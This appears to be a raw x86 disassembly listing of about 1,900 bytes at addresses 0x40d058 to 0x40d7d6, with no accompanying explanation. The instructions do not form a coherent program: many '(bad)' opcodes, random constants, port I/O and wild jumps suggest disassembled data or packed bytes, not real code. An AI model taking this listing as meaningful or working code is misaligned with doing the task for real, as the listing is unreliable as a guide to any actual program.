  40d058:	enter  0xbb8a,0xd7
  40d05c:	aam    0x97
  40d05e:	jae    0x40d01a
  40d060:	mov    eax,ds:0x6db76c2d
  40d065:	cmp    ebx,DWORD PTR [esp+eax*2]
  40d068:	and    dl,BYTE PTR [eax]
  40d06a:	fucomi st,st(4)
  40d06c:	(bad)  
  40d06d:	inc    edx
  40d06e:	mov    ebx,0x5da67cb1
  40d073:	add    BYTE PTR [edx-0x51],dl
  40d076:	sub    eax,0x2bb3bd9c
  40d07b:	mov    dh,0xb0
  40d07d:	mov    ch,0xdb
  40d07f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d080:	(bad)  
  40d081:	frstor [ecx+0x6a78ef9e]
  40d087:	and    DWORD PTR [ebp+ebx*8-0xa17876a],ecx
  40d08e:	das    
  40d08f:	ja     0x40d032
  40d091:	mov    ds:0xb64e385d,eax
  40d096:	data16 test al,0x74
  40d099:	test   eax,0x8fb0bfd7
  40d09e:	sbb    bl,BYTE PTR [eax+0x5b02c123]
  40d0a4:	jecxz  0x40d08f
  40d0a6:	dec    ecx
  40d0a8:	add    DWORD PTR [edx+eiz*4],0xffffffc9
  40d0ac:	mov    dh,0xdb
  40d0ae:	mov    dh,0xb1
  40d0b0:	lods   eax,DWORD PTR ds:[esi]
  40d0b1:	pop    eax
  40d0b2:	in     al,0xe5
  40d0b4:	loopne 0x40d0d4
  40d0b6:	bound  edx,QWORD PTR es:[ecx-0x6b]
  40d0ba:	and    ebp,DWORD PTR [ebp-0x41]
  40d0bd:	outs   dx,BYTE PTR ds:[esi]
  40d0be:	adc    al,0x52
  40d0c0:	cmp    DWORD PTR [edi-0x66cfb348],esi
  40d0c6:	(bad)  
  40d0c7:	imul   edx,DWORD PTR [ebp-0x23abb24a],0xf014da4a
  40d0d1:	and    ebp,DWORD PTR [ebp-0x4f]
  40d0d4:	sub    eax,0xa1e6ee6d
  40d0d9:	jle    0x40d122
  40d0db:	popa   
  40d0dc:	daa    
  40d0dd:	push   esp
  40d0de:	ret    0xbb42
  40d0e1:	mov    ah,0x2
  40d0e3:	out    0xce,eax
  40d0e5:	fld    DWORD PTR [esi]
  40d0e7:	repnz pop es
  40d0e9:	loopne 0x40d073
  40d0eb:	sbb    ebx,DWORD PTR [ebx]
  40d0ed:	ins    DWORD PTR es:[edi],dx
  40d0ee:	jmp    0x40d139
  40d0f0:	in     eax,0x43
  40d0f2:	xor    cl,BYTE PTR [edx+0x57]
  40d0f5:	mov    eax,0x2b62255d
  40d0fa:	fild   QWORD PTR [esi-0x1d]
  40d0fd:	adc    edx,DWORD PTR [edx]
  40d0ff:	adc    al,0x35
  40d101:	add    BYTE PTR [esi+0x42],cl
  40d104:	fwait
  40d105:	int3   
  40d106:	mov    edx,0x3db6b76
  40d10b:	fimul  WORD PTR [esi]
  40d10d:	mov    edi,0x7a79516a
  40d112:	(bad)  
  40d114:	pop    ebx
  40d115:	mov    ds:0xfef1a1b0,al
  40d11a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d11b:	xor    al,0x8b
  40d11d:	enter  0xc62f,0xb6
  40d121:	jno    0x40d18e
  40d123:	repnz push ss
  40d125:	jno    0x40d122
  40d127:	push   edi
  40d128:	xchg   edx,eax
  40d129:	push   cs
  40d12a:	add    ebp,ebp
  40d12c:	jbe    0x40d199
  40d12e:	fisttp DWORD PTR [ebp-0xa6438bb]
  40d134:	cmc    
  40d135:	out    0x4d,al
  40d137:	xchg   esi,eax
  40d138:	cwde   
  40d139:	fnsave [esi-0x435d2e4f]
  40d13f:	aas    
  40d140:	rcr    BYTE PTR fs:[ebx+0x1ba582b0],cl
  40d147:	in     eax,0x50
  40d149:	sub    dh,BYTE PTR [edx+0x48]
  40d14c:	or     DWORD PTR [ebp-0x5d],esp
  40d14f:	pop    ebp
  40d150:	ficomp DWORD PTR [eax+0x6a]
  40d153:	mov    esp,0x3d6e302
  40d158:	test   DWORD PTR [eax+0x5ed83b95],esi
  40d15e:	shr    BYTE PTR [ebp+0x60b541ef],0x6c
  40d165:	xchg   edx,eax
  40d166:	lods   eax,DWORD PTR ds:[esi]
  40d167:	lods   eax,DWORD PTR ds:[esi]
  40d168:	sub    eax,0xa64bd85d
  40d16d:	sub    edx,DWORD PTR [eax]
  40d16f:	dec    esp
  40d170:	sbb    DWORD PTR [edx+0x6b684ad1],0x17
  40d177:	fiadd  DWORD PTR [edi+0x16]
  40d17a:	pop    esp
  40d17b:	std    
  40d17c:	pusha  
  40d17d:	stos   BYTE PTR es:[edi],al
  40d17e:	enter  0x56d7,0xe9
  40d182:	mov    eax,ds:0xfa040d5b
  40d187:	add    edi,edx
  40d189:	(bad)  
  40d18a:	jge    0x40d13f
  40d18c:	sub    BYTE PTR [esi-0x73],0x60
  40d190:	or     DWORD PTR [ebp+eax*1-0x1c],0x616b6bcb
  40d198:	jmp    0x40d182
  40d19a:	sub    ebx,edi
  40d19c:	int3   
  40d19d:	jae    0x40d16d
  40d19f:	push   0x85ad1c68
  40d1a4:	test   DWORD PTR [ebp+0x1e],ebp
  40d1a7:	inc    esp
  40d1a8:	xor    BYTE PTR [eax-0x15],dh
  40d1ab:	lods   al,BYTE PTR ds:[esi]
  40d1ac:	or     esp,eax
  40d1ae:	fild   DWORD PTR [edx-0x1d]
  40d1b1:	repnz aas 
  40d1b3:	fiadd  WORD PTR [eax]
  40d1b5:	dec    eax
  40d1b6:	lds    edx,FWORD PTR [eax]
  40d1b8:	out    0xd0,eax
  40d1ba:	ds mov al,0xd2
  40d1bd:	push   0xdf0b6e00
  40d1c2:	pop    edi
  40d1c3:	repnz sub bh,cl
  40d1c6:	inc    DWORD PTR [edx+ebx*8]
  40d1c9:	jbe    0x40d16c
  40d1cb:	fisttp QWORD PTR [esi-0x63]
  40d1ce:	sub    BYTE PTR [edi+0x1c],bl
  40d1d1:	je     0x40d1c7
  40d1d3:	retf   
  40d1d4:	adc    DWORD PTR [ebp-0x28],ecx
  40d1d7:	mov    dh,0xb6
  40d1d9:	frstor [eax]
  40d1db:	xchg   esp,eax
  40d1dc:	push   edx
  40d1dd:	jge    0x40d25b
  40d1df:	ret    0x37a
  40d1e2:	xchg   ebp,eax
  40d1e3:	(bad)  
  40d1e4:	mov    dh,0xd5
  40d1e6:	adc    DWORD PTR [edi+0x2342d57],esi
  40d1ec:	pshufw mm2,mm4,0xce
  40d1f0:	ins    DWORD PTR es:[edi],dx
  40d1f1:	sub    al,0xb4
  40d1f3:	in     eax,dx
  40d1f4:	dec    eax
  40d1f5:	xor    eax,0xa0681e0b
  40d1fa:	out    0xa2,al
  40d1fc:	pop    ds
  40d1fd:	mov    dh,0xb0
  40d1ff:	sub    eax,0x79f58f2c
  40d204:	addr16 xchg edx,eax
  40d206:	add    esp,0xbb5b4d1d
  40d20c:	ins    DWORD PTR es:[edi],dx
  40d20d:	fisttp DWORD PTR [ecx+0x3b]
  40d210:	loop   0x40d1a1
  40d212:	(bad)  
  40d213:	into   
  40d214:	add    DWORD PTR [eax],esp
  40d216:	mov    ecx,0xd851e76e
  40d21b:	cs ins DWORD PTR es:[edi],dx
  40d21d:	out    dx,eax
  40d21e:	adc    eax,0xb3efd81a
  40d223:	pop    ebx
  40d224:	add    DWORD PTR [esi-0x25],esi
  40d227:	ds mov edx,0xafb8b369
  40d22d:	mov    ecx,0xbfaa5865
  40d232:	test   BYTE PTR [esi-0x49595a78],dh
  40d238:	cwde   
  40d239:	imul   ebx,DWORD PTR [ebp-0x33],0xffffffa4
  40d23d:	cwde   
  40d23e:	test   DWORD PTR [ebp-0x79071723],ebp
  40d244:	neg    BYTE PTR [edx+0x34d1e0b1]
  40d24a:	push   ss
  40d24b:	lea    ebp,[ebp-0x5b4e4923]
  40d251:	and    eax,0x79
  40d254:	cld    
  40d255:	sub    DWORD PTR [ecx],0x20
  40d258:	(bad)  
  40d259:	sbb    ebx,DWORD PTR [ebx]
  40d25b:	or     eax,0x74188cc1
  40d260:	jecxz  0x40d292
  40d262:	mov    esp,0xb6ed3127
  40d267:	sub    eax,0xb6aadfb5
  40d26c:	add    bh,BYTE PTR [ebp+0x4c]
  40d26f:	out    0x80,al
  40d271:	mov    edi,0xbb6275f
  40d276:	or     ecx,DWORD PTR [ebx+0x5cc0c1bb]
  40d27c:	mov    WORD PTR [ebx+0x36d5bc1],?
  40d282:	mov    dh,0xda
  40d284:	and    eax,DWORD PTR [esi+0x15]
  40d287:	fs loopne 0x40d2be
  40d28a:	outs   dx,BYTE PTR ds:[esi]
  40d28b:	mov    cl,0x6d
  40d28d:	sub    al,0xb5
  40d28f:	jno    0x40d214
  40d291:	mov    dh,0x59
  40d293:	mov    edx,0x6bef3235
  40d298:	mov    ebx,0xac78b0b5
  40d29d:	or     bl,BYTE PTR [esi-0x5e7cc42a]
  40d2a3:	mov    esi,0x26ae952b
  40d2a8:	push   0x1fbdb1d8
  40d2ad:	xchg   ecx,eax
  40d2ae:	lea    ebx,[ebx]
  40d2b0:	(bad)  [esi-0x1ba95f17]
  40d2b6:	cwde   
  40d2b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d2b8:	dec    esi
  40d2b9:	cmp    al,BYTE PTR [eax-0x46]
  40d2bc:	push   ss
  40d2bd:	mov    al,0xd0
  40d2bf:	outs   dx,BYTE PTR ds:[esi]
  40d2c0:	das    
  40d2c1:	shl    BYTE PTR [esi+ecx*1],0xd9
  40d2c5:	aaa    
  40d2c6:	nop
  40d2c7:	lea    esi,[esi+0x6b]
  40d2ca:	mov    bh,0xc2
  40d2cc:	stos   BYTE PTR es:[edi],al
  40d2cd:	(bad)  
  40d2ce:	xchg   ebp,eax
  40d2cf:	cmp    BYTE PTR [ebx],bl
  40d2d1:	inc    esi
  40d2d2:	mov    eax,ds:0xd866edf6
  40d2d7:	mov    dh,0x4
  40d2d9:	(bad)  
  40d2da:	scas   al,BYTE PTR es:[edi]
  40d2db:	mov    al,ds:0x9fbdd7a9
  40d2e1:	clc    
  40d2e2:	add    edx,0x9a206ed6
  40d2e8:	loopne 0x40d2b5
  40d2ea:	gs sub eax,0x616d0ea6
  40d2f0:	adc    DWORD PTR [edx-0x23],0x14
  40d2f4:	push   ebx
  40d2f5:	and    ch,BYTE PTR [eax-0x50]
  40d2f8:	dec    ebx
  40d2f9:	(bad)  [ebp-0x345a4673]
  40d2ff:	fucomp st(6)
  40d301:	in     al,dx
  40d302:	mov    ecx,0x687b8695
  40d307:	popa   
  40d308:	stos   DWORD PTR es:[edi],eax
  40d309:	ins    DWORD PTR es:[edi],dx
  40d30a:	sti    
  40d30b:	or     bl,ah
  40d30d:	in     eax,0xf2
  40d30f:	rol    dl,1
  40d311:	push   eax
  40d312:	fistp  DWORD PTR [esi+0x4fc7b2e8]
  40d318:	sti    
  40d319:	push   esi
  40d31a:	jmp    0x40d333
  40d31c:	mov    ah,0xe5
  40d31e:	mov    dl,0xd1
  40d320:	daa    
  40d321:	stos   BYTE PTR es:[edi],al
  40d322:	wrmsr  
  40d324:	sahf   
  40d325:	imul   edi,DWORD PTR [ecx+esi*2+0x4b1bb46c],0x92bde88e
  40d330:	jb     0x40d2eb
  40d332:	arpl   WORD PTR [ecx],sp
  40d334:	fdiv   DWORD PTR [esi-0x4aefd2d2]
  40d33a:	shl    DWORD PTR [ebx+0x77055ee8],1
  40d340:	or     esi,DWORD PTR [esi+0x6cb42db4]
  40d346:	adc    edx,DWORD PTR [ebp+0x5c29c24a]
  40d34c:	sbb    eax,0xedaad4b2
  40d351:	push   ebx
  40d352:	ror    DWORD PTR [ebx],cl
  40d354:	std    
  40d355:	mov    ds:0xa2db07c2,eax
  40d35a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d35b:	lea    edx,[eax+0x2927ec05]
  40d361:	sub    BYTE PTR [ebp+0x53376dbe],0x95
  40d368:	or     ebp,DWORD PTR [ebx+ebx*2+0x32]
  40d36c:	in     eax,0xa7
  40d36e:	push   ds
  40d36f:	add    BYTE PTR [eax+eiz*4+0x5826b6da],dh
  40d376:	into   
  40d377:	mov    edi,0x655c6ec9
  40d37c:	sbb    ebp,DWORD PTR [ebx+0x37]
  40d37f:	push   ss
  40d380:	fcomp  DWORD PTR [ecx]
  40d382:	sub    al,0xf3
  40d384:	xchg   ebx,eax
  40d385:	imul   esi,DWORD PTR ds:0xb689717c,0x3c6b602d
  40d38f:	or     dh,BYTE PTR [ecx-0x3c7d7031]
  40d395:	sub    eax,0x17855b01
  40d39a:	adc    BYTE PTR [edi-0x727a3266],0x76
  40d3a1:	mov    ds:0xa29b6980,eax
  40d3a6:	add    bh,BYTE PTR [edi]
  40d3a8:	xchg   dh,ch
  40d3aa:	push   0x75c6db1b
  40d3af:	fldenv [eax-0x31]
  40d3b2:	mov    dh,0x7d
  40d3b4:	and    DWORD PTR [eax+eiz*1],esp
  40d3b7:	les    esi,FWORD PTR [esi-0x4498a48b]
  40d3bd:	pop    edi
  40d3be:	or     eax,0x5047050
  40d3c3:	retf   0x6a09
  40d3c6:	mov    bh,0xb6
  40d3c8:	test   DWORD PTR [eax+eax*4],edi
  40d3cb:	mov    al,0x48
  40d3cd:	sar    BYTE PTR [edx+0x24],cl
  40d3d0:	pop    ss
  40d3d1:	cmp    ch,BYTE PTR [edx+0x6b]
  40d3d4:	cmp    BYTE PTR [ecx-0x31],bh
  40d3d7:	push   edi
  40d3d8:	and    al,BYTE PTR [ebx+eax*1]
  40d3db:	jbe    0x40d380
  40d3dd:	pop    ebp
  40d3de:	push   0xb
  40d3e0:	xchg   ecx,eax
  40d3e1:	xchg   DWORD PTR [eax+0x6e0f9af5],ebx
  40d3e7:	loope  0x40d3f6
  40d3e9:	jo     0x40d394
  40d3eb:	jbe    0x40d43f
  40d3ed:	push   es
  40d3ee:	mov    dh,0x54
  40d3f0:	outs   dx,DWORD PTR ds:[esi]
  40d3f1:	xor    al,0x7c
  40d3f3:	int3   
  40d3f4:	inc    esp
  40d3f5:	or     ecx,DWORD PTR [ebx]
  40d3f7:	or     edx,eax
  40d3f9:	(bad)  
  40d3fa:	popa   
  40d3fb:	popa   
  40d3fc:	jae    0x40d3d8
  40d3fe:	mov    dh,0xb1
  40d400:	popa   
  40d401:	mov    al,ds:0x45abd81e
  40d406:	(bad)  
  40d407:	lock sahf 
  40d409:	(bad)  
  40d40a:	ret    0xc2c2
  40d40d:	cmp    BYTE PTR [edx],ah
  40d40f:	imul   ebp,DWORD PTR [edi+0x7024c4e0],0xc2ed6c2d
  40d419:	pop    eax
  40d41a:	popa   
  40d41b:	sahf   
  40d41c:	dec    edi
  40d41d:	xchg   edx,eax
  40d41e:	inc    esp
  40d41f:	push   ebp
  40d420:	inc    eax
  40d421:	lods   eax,DWORD PTR ds:[esi]
  40d422:	lea    eax,[esi-0x50]
  40d425:	mov    al,0x56
  40d427:	fidivr WORD PTR [edi-0x39]
  40d42a:	cmp    cl,BYTE PTR [ebp-0x252727a4]
  40d430:	mov    al,0x43
  40d432:	adc    DWORD PTR [esi+edx*8],0xffffff9c
  40d436:	mov    ch,0x3d
  40d438:	(bad)  [ebp+0x6b72a58d]
  40d43e:	scas   al,BYTE PTR es:[edi]
  40d43f:	repnz ins DWORD PTR es:[edi],dx
  40d441:	dec    edi
  40d442:	fwait
  40d443:	push   ss
  40d444:	mov    ebp,0xd6b6171b
  40d449:	pop    edx
  40d44a:	jmp    0x40d4c2
  40d44c:	retf   
  40d44d:	xor    eax,0xd5158494
  40d452:	test   al,0x6a
  40d454:	sub    esi,DWORD PTR [edi+0x6d6a181a]
  40d45a:	(bad)  
  40d45b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d45c:	fsubr  DWORD PTR [edx*4-0x2729f48]
  40d463:	inc    ebx
  40d464:	add    bh,BYTE PTR ds:0xb4b8c135
  40d46a:	mov    cl,0x2d
  40d46c:	addr16 jl 0x40d422
  40d46f:	pop    es
  40d470:	mov    bh,0x6c
  40d472:	mov    al,0x9c
  40d474:	xor    al,0x85
  40d476:	mov    dh,0xb4
  40d478:	sbb    DWORD PTR [eax],0xfffffffa
  40d47b:	icebp  
  40d47c:	mov    bl,0x99
  40d47e:	mov    al,0x3d
  40d480:	mov    al,ds:0x68b6b685
  40d485:	inc    esp
  40d486:	jno    0x40d473
  40d488:	cmc    
  40d489:	fwait
  40d48a:	neg    bl
  40d48c:	(bad)  
  40d48d:	(bad)  
  40d48e:	mov    dh,0x80
  40d490:	es add eax,0x2d378d77
  40d496:	repnz sub esp,DWORD PTR [ecx+0x63]
  40d49a:	arpl   WORD PTR [ebx-0x38],si
  40d49d:	sub    al,0xd0
  40d49f:	stos   DWORD PTR es:[edi],eax
  40d4a0:	inc    esi
  40d4a1:	or     al,0xe7
  40d4a3:	xor    BYTE PTR [edi-0x569c9c93],0xdb
  40d4aa:	les    esp,FWORD PTR [ebp-0x5b48b58c]
  40d4b0:	jmp    0x2b1c4b16
  40d4b5:	ins    BYTE PTR es:[edi],dx
  40d4b6:	pop    esp
  40d4b7:	loope  0x40d4f3
  40d4b9:	aaa    
  40d4ba:	loop   0x40d52a
  40d4bc:	adc    dh,BYTE PTR [edx+eiz*2-0x48948ec2]
  40d4c3:	xchg   edx,eax
  40d4c4:	fsubr  QWORD PTR [ebp+edi*2-0x41793ecb]
  40d4cb:	jb     0x40d458
  40d4cd:	mov    dh,0xe
  40d4cf:	and    BYTE PTR [esi],dl
  40d4d1:	shr    DWORD PTR [esi],0x7a
  40d4d4:	cmp    esp,ebp
  40d4d6:	ins    DWORD PTR es:[edi],dx
  40d4d7:	popa   
  40d4d8:	stos   DWORD PTR es:[edi],eax
  40d4d9:	ins    DWORD PTR es:[edi],dx
  40d4da:	pop    ss
  40d4db:	dec    edi
  40d4dc:	xchg   esp,eax
  40d4dd:	ins    BYTE PTR es:[edi],dx
  40d4de:	mov    dh,0xb0
  40d4e0:	pop    DWORD PTR [eax+0x63]
  40d4e3:	test   DWORD PTR [eax+0x6c],ebp
  40d4e6:	fld    TBYTE PTR [ebp+0x1]
  40d4e9:	dec    ebp
  40d4ea:	cli    
  40d4eb:	mov    BYTE PTR [edx],dh
  40d4ed:	pop    ss
  40d4ee:	sub    cl,0x18
  40d4f1:	mov    ds:0xbb5db4b5,eax
  40d4f6:	test   DWORD PTR [edx-0x17],ebx
  40d4f9:	ds sub al,0x9e
  40d4fc:	std    
  40d4fd:	or     DWORD PTR [ebx+0x6075a361],ebx
  40d503:	outs   dx,DWORD PTR ds:[esi]
  40d504:	jae    0x40d490
  40d506:	rol    BYTE PTR [ebx+0x5f],cl
  40d509:	mov    ds:0x6da361,eax
  40d50e:	jge    0x40d509
  40d510:	pop    esp
  40d511:	sbb    bl,BYTE PTR [ecx-0x25e89275]
  40d517:	ins    DWORD PTR es:[edi],dx
  40d518:	aam    0x77
  40d51a:	call   0x8175d09d
  40d51f:	and    al,0xb9
  40d521:	aas    
  40d522:	lea    ebp,[ebp+0x63]
  40d525:	mov    eax,ds:0x87cc4302
  40d52a:	ficom  DWORD PTR [eiz*1+0x68dada1e]
  40d531:	mov    bh,0x8
  40d533:	into   
  40d534:	mov    esp,0x8bf32ff5
  40d539:	add    DWORD PTR [edi-0x2e],esi
  40d53c:	ins    DWORD PTR es:[edi],dx
  40d53d:	test   eax,0xc44acadd
  40d542:	sbb    eax,0xd126f923
  40d547:	mov    DWORD PTR [eax-0x4925a7a3],esi
  40d54d:	adc    DWORD PTR [edi-0x2763e5f],edx
  40d553:	(bad)  
  40d554:	iret   
  40d555:	call   0x1787b0c7
  40d55a:	cmp    BYTE PTR [edx-0x5e],cl
  40d55d:	add    bl,BYTE PTR [edx]
  40d55f:	scas   eax,DWORD PTR es:[edi]
  40d560:	xchg   edx,eax
  40d561:	jno    0x40d590
  40d563:	shl    DWORD PTR [esi+0x76ba14b5],1
  40d569:	push   cs
  40d56a:	pop    ss
  40d56b:	repnz adc dl,BYTE PTR ds:0xa971adc2
  40d572:	cmp    ebp,DWORD PTR [edi]
  40d574:	das    
  40d575:	adc    eax,DWORD PTR [ebp+0x38]
  40d578:	jecxz  0x40d525
  40d57a:	dec    ecx
  40d57b:	mov    cl,0xdd
  40d57d:	retf   0xdc2
  40d580:	pop    ds
  40d581:	cld    
  40d582:	jge    0x40d50a
  40d584:	fsubr  QWORD PTR [edx+0x56db6d78]
  40d58a:	pop    ss
  40d58b:	std    
  40d58c:	cs xchg edi,eax
  40d58e:	jo     0x40d55b
  40d590:	scas   eax,DWORD PTR es:[edi]
  40d591:	imul   eax,DWORD PTR ds:0xba0eb701,0x26
  40d598:	lea    ebp,[esp+eiz*2]
  40d59b:	mov    WORD PTR [eax+0x5a],gs
  40d59e:	xchg   ebp,eax
  40d59f:	test   DWORD PTR [ebp-0x25],ebp
  40d5a2:	add    al,0x27
  40d5a4:	or     ebx,DWORD PTR [eax+0x4b5fd992]
  40d5aa:	(bad)  
  40d5ab:	fsubr  st,st(0)
  40d5ad:	mov    BYTE PTR [ebx],cl
  40d5af:	fld    DWORD PTR [ecx-0x7f]
  40d5b2:	ror    DWORD PTR [ecx],1
  40d5b4:	inc    edx
  40d5b5:	enter  0x50db,0xdc
  40d5b9:	pop    eax
  40d5ba:	lods   al,BYTE PTR ds:[esi]
  40d5bb:	popa   
  40d5bc:	inc    ebp
  40d5bd:	sub    ecx,0x66
  40d5c0:	xor    BYTE PTR [eax+0x20],dl
  40d5c3:	cmp    al,BYTE PTR [eax+0x5cd75b0b]
  40d5c9:	popf   
  40d5ca:	push   ds
  40d5cb:	inc    edi
  40d5cc:	pop    ecx
  40d5cd:	jmp    0x40d57a
  40d5cf:	jno    0x40d63c
  40d5d1:	fdiv   QWORD PTR ds:0xb306d7c3
  40d5d7:	xchg   BYTE PTR [edx+0x58dc1f36],cl
  40d5dd:	bound  esp,QWORD PTR [ecx-0x57]
  40d5e0:	jg     0x40d573
  40d5e2:	shl    ecx,cl
  40d5e4:	mov    dh,BYTE PTR [esi+0x7b]
  40d5e7:	dec    ebx
  40d5e8:	pop    ebx
  40d5e9:	pop    ebx
  40d5ea:	push   edi
  40d5eb:	inc    di
  40d5ed:	jmp    0xef87041e
  40d5f2:	xor    BYTE PTR [ecx+0x301b0bb5],0x3b
  40d5f9:	test   DWORD PTR [edx],0x9db30e1e
  40d5ff:	ins    DWORD PTR es:[edi],dx
  40d600:	imul   ebx,DWORD PTR [ebx-0x48],0x5d
  40d604:	hlt    
  40d605:	inc    ebp
  40d606:	inc    ebx
  40d607:	out    dx,eax
  40d608:	and    dh,ch
  40d60a:	sub    BYTE PTR [esi+ecx*8+0x6d6e146e],dh
  40d611:	sub    DWORD PTR [eax],0xffffffcd
  40d614:	jp     0x40d5f1
  40d616:	adc    BYTE PTR [eax],dh
  40d618:	add    BYTE PTR [ebp-0x2f4a47aa],0xa7
  40d61f:	inc    eax
  40d620:	sbb    al,0x1
  40d622:	out    dx,al
  40d623:	jecxz  0x40d5d7
  40d625:	xchg   edx,eax
  40d626:	outs   dx,BYTE PTR ds:[esi]
  40d627:	pop    ebx
  40d628:	mov    ah,0xdb
  40d62a:	inc    ecx
  40d62b:	push   cs
  40d62c:	xor    ch,BYTE PTR [edi+0x2f]
  40d62f:	leave  
  40d630:	jmp    0xb2c0:0x4b8e998f
  40d637:	aam    0x5f
  40d639:	mov    al,0xc2
  40d63b:	jnp    0x40d62b
  40d63d:	xor    BYTE PTR [esi-0x5e92494a],dl
  40d643:	add    bh,al
  40d645:	in     eax,0xce
  40d647:	stos   BYTE PTR es:[edi],al
  40d648:	mov    al,BYTE PTR [ecx-0x44]
  40d64b:	lea    esi,[esi-0x25]
  40d64e:	fdivr  DWORD PTR [ebp-0x48]
  40d651:	adc    dl,al
  40d653:	gs jecxz 0x40d6c4
  40d656:	adc    al,0x45
  40d658:	sub    eax,0x3ab76c2c
  40d65d:	das    
  40d65e:	fs aas 
  40d660:	mov    eax,ds:0x4003ac19
  40d665:	enter  0xa5b7,0x6d
  40d669:	sub    ebp,edi
  40d66b:	xor    eax,0x6bfd8cc6
  40d670:	call   0x1616:0x16a4a00e
  40d677:	sbb    bh,BYTE PTR [eax+0x31]
  40d67a:	ds test DWORD PTR cs:[ebx],ebp
  40d67e:	mov    ah,0x2d
  40d680:	push   ss
  40d681:	push   ss
  40d682:	fmul   DWORD PTR [edi+ebp*8-0x4c1407d0]
  40d689:	mov    cl,0x6d
  40d68b:	fdiv   QWORD PTR [esi+0xe5d548d]
  40d691:	xchg   ebp,eax
  40d692:	lds    edi,FWORD PTR [edx+0x2a]
  40d695:	mov    bl,0x0
  40d697:	mov    BYTE PTR [edx+ebx*2-0x42884bb9],dl
  40d69e:	aas    
  40d69f:	fsub   DWORD PTR [edx-0x27]
  40d6a2:	ins    DWORD PTR es:[edi],dx
  40d6a3:	xchg   edi,eax
  40d6a4:	pop    edx
  40d6a5:	or     eax,DWORD PTR [ecx-0x5eebe9a7]
  40d6ab:	lods   eax,DWORD PTR ds:[esi]
  40d6ac:	adc    al,0xf4
  40d6ae:	fisubr DWORD PTR [ebp+0x69]
  40d6b1:	stos   DWORD PTR es:[edi],eax
  40d6b2:	xor    dh,BYTE PTR [ebp+0x3eb6e370]
  40d6b8:	and    eax,0x6db0fe08
  40d6bd:	fisttp DWORD PTR ds:0xc85c6695
  40d6c3:	je     0x40d72d
  40d6c5:	lock sbb ah,ah
  40d6c8:	fcmovnu st,st(2)
  40d6ca:	jbe    0x40d66f
  40d6cc:	popa   
  40d6cd:	imul   ecx,DWORD PTR [esi+0x1af8c849],0x2e53b302
  40d6d7:	mov    ch,0xd
  40d6d9:	(bad)  
  40d6da:	call   0xa7f4804e
  40d6df:	mov    ds:0x44b6c2bc,al
  40d6e4:	fcomi  st,st(2)
  40d6e6:	int    0xd1
  40d6e8:	fistp  QWORD PTR [ebp-0x4d]
  40d6eb:	pop    edi
  40d6ec:	jae    0x40d719
  40d6ee:	push   ebp
  40d6ef:	popa   
  40d6f0:	jecxz  0x40d732
  40d6f2:	and    dh,bl
  40d6f4:	gs int 0xef
  40d6f7:	(bad)  
  40d6f8:	ins    DWORD PTR es:[edi],dx
  40d6f9:	or     ebx,DWORD PTR ds:0x3ddc6d74
  40d6ff:	push   ss
  40d700:	and    eax,0xa2e8ecaa
  40d705:	pop    ebx
  40d706:	mov    ebx,0x45a3adb1
  40d70b:	aaa    
  40d70c:	adc    ebp,DWORD PTR [esp+eax*2]
  40d70f:	pushf  
  40d710:	shl    BYTE PTR [ebp+0x61],1
  40d713:	imul   ebx,DWORD PTR [ebx],0x79
  40d716:	sub    dl,bh
  40d718:	xor    dh,BYTE PTR [edx+ecx*1-0x3]
  40d71c:	rol    DWORD PTR [eax-0x69],0x2e
  40d720:	ins    DWORD PTR es:[edi],dx
  40d721:	dec    ebp
  40d722:	in     al,dx
  40d723:	clc    
  40d724:	enter  0x5946,0x84
  40d728:	push   ecx
  40d729:	dec    edx
  40d72a:	lahf   
  40d72b:	add    BYTE PTR [ebx+0x1b],bl
  40d72e:	pop    ebx
  40d72f:	stc    
  40d730:	iret   
  40d731:	clc    
  40d732:	add    bh,bl
  40d734:	cdq    
  40d735:	sub    al,0x31
  40d737:	dec    esi
  40d738:	cs icebp 
  40d73a:	or     eax,0xf285d10d
  40d73f:	jns    0x40d741
  40d741:	dec    ebx
  40d742:	jp     0x40d781
  40d744:	shl    BYTE PTR [ebx-0x18],cl
  40d747:	xchg   ebp,eax
  40d748:	aam    0x6e
  40d74a:	sub    al,0xb4
  40d74c:	js     0x40d6f5
  40d74e:	add    al,0x5e
  40d750:	pop    edx
  40d751:	jno    0xedad4377
  40d757:	mov    dh,0x59
  40d759:	fidiv  DWORD PTR [edx]
  40d75b:	push   ebp
  40d75c:	scas   eax,DWORD PTR es:[edi]
  40d75d:	imul   edi,DWORD PTR [ebx],0x5e
  40d760:	aas    
  40d761:	test   al,0xb2
  40d763:	mov    cl,0xd0
  40d765:	add    DWORD PTR cs:[eax],edx
  40d768:	xchg   ebp,eax
  40d769:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d76a:	(bad)  
  40d76b:	loope  0x40d7eb
  40d76d:	add    DWORD PTR [ebx+0x5b],ebx
  40d770:	jecxz  0x40d744
  40d772:	and    BYTE PTR [ebp-0x57],0x57
  40d776:	and    al,0x98
  40d778:	mov    al,ds:0xadb67428
  40d77d:	mov    DWORD PTR [esi+0x65],ebp
  40d780:	mov    eax,0x56ccab34
  40d785:	xchg   esi,eax
  40d786:	jecxz  0x40d756
  40d788:	mov    ds:0xdddad8dd,eax
  40d78d:	jns    0x40d7a5
  40d78f:	mov    ebp,0x3b183cac
  40d794:	jne    0x40d73b
  40d796:	bound  esp,QWORD PTR [ebx-0x4cc2128c]
  40d79c:	outs   dx,DWORD PTR ds:[esi]
  40d79d:	lds    ebx,FWORD PTR [ecx]
  40d79f:	mov    eax,ds:0x64856d40
  40d7a4:	or     dl,BYTE PTR [eax+edi*2]
  40d7a7:	jne    0x40d764
  40d7a9:	fist   DWORD PTR [esi+0x8707f96]
  40d7af:	add    BYTE PTR ds:0xa4ec003c,dl
  40d7b5:	mov    dh,0x85
  40d7b7:	adc    al,0xc9
  40d7b9:	cmc    
  40d7ba:	fcmovnu st,st(2)
  40d7bc:	lea    esi,[esi-0x10]
  40d7bf:	out    0x26,eax
  40d7c1:	aas    
  40d7c2:	jle    0x40d78d
  40d7c4:	mov    al,0x62
  40d7c6:	inc    ebx
  40d7c7:	add    eax,0x6376c10d
  40d7cc:	jnp    0x40d758
  40d7ce:	sub    BYTE PTR [ebp+0x44],al
  40d7d1:	add    DWORD PTR [edx],esi
  40d7d3:	rcr    bl,1
  40d7d5:	(bad)  
  40d7d6:	outs   dx,BYTE PTR ds:[esi]
